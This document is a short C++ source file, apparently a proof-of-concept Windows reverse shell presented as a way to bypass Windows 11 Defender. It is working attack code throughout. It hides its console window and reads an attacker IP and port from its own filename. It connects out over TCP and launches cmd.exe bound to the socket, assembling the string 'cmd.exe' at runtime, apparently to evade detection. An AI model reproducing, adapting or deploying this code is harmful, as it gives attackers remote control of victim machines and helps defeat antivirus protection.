#POC reverse shell written by Norbert Tihanyi to bypass Windows 11 Defender (December 2021) 
#Twitter: @TihanyiNorbert

#include "stdafx.h"
#include <winsock2.h>
#include <stdio.h>
#include <string>

#pragma comment(lib,"ws2_32")
#pragma warning(disable:4996) 
WSADATA wsaData; SOCKET s1;
struct sockaddr_in R;
STARTUPINFO A;
PROCESS_INFORMATION B;
using std::string;
string getFileName(const string& s) {

	char sep = '/';
	
	#ifdef _WIN32
		sep = '\\';
	#endif
	size_t i = s.rfind(sep, s.length());
	if (i != string::npos) {
		return(s.substr(i + 1, s.length() - i));
	}

	return("");
}

int main(int argc, char *argv[])
{
	FreeConsole(); //Hide window
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	string path =getFileName(argv[0]);
	path.resize(path.size() - 4); //remove .exe from the file
	//replace x to "."
	for (int i = 0; i < path.size(); i++) {
		if (path[i] == 'x') {
			path[i] = '.';
		}
	}
	//PORT and IP from the executable
	size_t i = path.rfind("_", path.length());
	string port = path.substr(i+1, i-path.length());
	string ip = path.substr(0, i);
	s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
	R.sin_family = AF_INET;
	R.sin_port = htons(std::stoul(port, nullptr, 0));
	R.sin_addr.s_addr = inet_addr(ip.c_str());
	WSAConnect(s1, (SOCKADDR*)&R, sizeof(R), 0, 0, 0, 0);
	memset(&A, 0, sizeof(A));
	A.cb = sizeof(A);
	A.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	A.hStdInput = A.hStdOutput = A.hStdError = (HANDLE)s1;
	TCHAR c[256] = L"cm";
	TCHAR d[256] = L"d.exe";
	CreateProcess(NULL, _tcscat(c, d), 0, 0, 1, 0, 0, 0, &A, &B);

}

